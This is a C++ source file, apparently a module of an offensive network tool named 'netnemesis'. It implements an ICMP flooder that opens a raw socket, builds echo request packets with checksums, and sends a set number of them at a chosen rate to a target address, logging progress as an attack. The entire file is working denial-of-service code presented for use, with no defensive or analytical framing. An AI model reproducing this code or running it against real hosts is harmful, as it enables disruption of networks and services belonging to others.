#include "netnemesis.h"

ICMPFlooder::ICMPFlooder() : raw_socket(-1) {}

ICMPFlooder::~ICMPFlooder() {
    if (raw_socket >= 0) close(raw_socket);
}

unsigned short ICMPFlooder::calculateChecksum(unsigned short *buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

bool ICMPFlooder::initialize() {
    raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (raw_socket < 0) {
        Utils::logError("Unable to create ICMP raw socket (root required)");
        return false;
    }
    
    Utils::logSuccess("ICMP Flooder ready");
    return true;
}

void ICMPFlooder::flood(const std::string &target, int packets, int rate) {
    if (!initialize()) return;
    
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    inet_pton(AF_INET, target.c_str(), &dest_addr.sin_addr);
    
    // Build an ICMP Echo Request packet
    char packet[64];
    struct icmphdr *icmp = (struct icmphdr *)packet;
    
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.id = getpid();
    icmp->un.echo.sequence = 0;
    
    // Payload
    memset(packet + sizeof(struct icmphdr), 0xA5, sizeof(packet) - sizeof(struct icmphdr));
    
    Utils::logAttack("Starting ICMP Flood against " + target + " (" + std::to_string(packets) + " packets)");
    
    int interval_us = 1000000 / rate; // Microsecondi tra pacchetti
    
    for (int i = 0; i < packets && g_running; i++) {
        icmp->un.echo.sequence = i;
        icmp->checksum = 0;
        icmp->checksum = calculateChecksum((unsigned short *)icmp, sizeof(packet) >> 1);
        
        sendto(raw_socket, packet, sizeof(packet), 0, 
               (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        
        if (i % 100 == 0) {
            std::lock_guard<std::mutex> lock(g_print_mutex);
            std::cout << "\r\033[31m[ICMP FLOOD] Inviati: " << i << "/" << packets 
                      << " (" << (i * 100 / packets) << "%)\033[0m" << std::flush;
        }
        
        usleep(interval_us);
    }
    
    std::cout << std::endl;
    Utils::logSuccess("ICMP Flood completed");
}